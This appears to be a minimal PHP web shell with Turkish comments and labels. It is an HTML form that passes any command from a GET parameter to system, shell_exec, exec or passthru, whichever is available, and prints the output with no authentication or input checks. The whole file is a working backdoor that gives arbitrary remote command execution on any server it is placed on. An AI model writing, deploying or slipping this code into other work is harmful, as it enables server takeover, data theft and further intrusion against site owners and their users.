<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<title></title>
</head>
<body bgcolor="gray">


<form action="" method="get">

	<strong>Komut : </strong> <input type="text" name="komut" placeholder="pwd"  /> <input type="submit" value="Komut" />

</form>
<br />


<?php 
function komut($komut){
	
	//system fonksiyonunu kontrol et
	if(function_exists('system'))
	{
		ob_start();
		system($komut);
		$sonuc = ob_get_contents();
		ob_end_clean();
	}
	
	//shell_exec fonksiyonunu kontrol et
	else if(function_exists('shell_exec'))
	{
		$sonuc = shell_exec($komut) ;
	}
	
	//exec fonksiyonunu kontrol et
	else if(function_exists('exec'))
	{
		exec($komut , $sonuc);
		$sonuc = implode("n" , $sonuc);
	}
	
	//passthru fonksiyonunu kontrol et
	else if(function_exists('passthru'))
	{
		ob_start();
		passthru($komut);
		$sonuc = ob_get_contents();
		ob_end_clean();
	}
	

	

	
	else
	{
		$sonuc = '<font color="red">Bütün fonksiyonlar engelli.</font>';
	}
	
	return "<pre>".$sonuc."</pre>";
}

if($_GET){
	
	// gelen komutu değişkene aktaralım
	$komut = $_GET['komut'];
	
	// gelen verinin boş olup olmadığına bakalım 
	if($komut == ""){
		echo '<font color="red">Lütfen boş alan bırakmayınız.</font>';
	}else {
		// asil işlem burada yapiliyor gelen veriler kontrol edildi boş değil artık komuta geçebilir.
		
		echo komut($komut);
		
	}
	
	
}





?>	
	
	
	
	
</body>
</html>